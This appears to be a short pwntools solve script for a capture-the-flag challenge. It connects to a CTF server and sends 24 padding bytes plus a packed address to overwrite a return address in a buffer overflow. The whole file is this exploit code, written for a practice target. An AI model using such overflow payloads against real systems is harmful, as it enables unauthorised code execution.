from pwn import *

p = remote("ctf.wicys.ritsec.cloud", 30600)

p.recvuntil(">")

p.sendline(b'A' * 24 + p64(0x0401202))

print(p.recvall().decode())
